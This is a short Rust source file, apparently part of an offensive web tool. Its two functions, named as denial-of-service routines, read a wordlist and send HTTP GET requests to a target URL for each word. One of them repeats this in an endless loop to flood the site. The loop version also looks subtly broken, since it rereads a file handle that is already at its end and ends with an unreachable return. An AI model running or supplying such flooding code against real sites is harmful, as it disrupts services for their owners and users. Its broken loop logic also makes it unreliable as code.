use colored::*;

use std::fs::File;
use std::io::{BufRead, BufReader};

pub async fn denial_of_service_end(wordlist_name: String, url: String) -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
    let wordlist = File::open(wordlist_name).expect("Failed to open the file");

    let reader = BufReader::new(&wordlist);

    for line in reader.lines() {
        if let Ok(word) = line {
            let target = url.clone().to_string() + "/" + &word.to_string();
            let _response = reqwest::get(target.clone()).await?;
            println!("{}: {}", "Target".cyan(), target.clone().magenta());
        }
    }
    Ok(())
}

pub async fn denial_of_service_loop(wordlist_name: String, url: String) -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
    let wordlist = File::open(wordlist_name).expect("Failed to open the file");
    
    loop {
        let reader = BufReader::new(&wordlist);
        for line in reader.lines() {
            if let Ok(word) = line {
                let target = url.clone().to_string() + "/" + &word.to_string();
                let _response = reqwest::get(target.clone()).await?;
                println!("{}: {}", "Target".cyan(), target.clone().magenta());
            }
        }
    }
    Ok(())
}
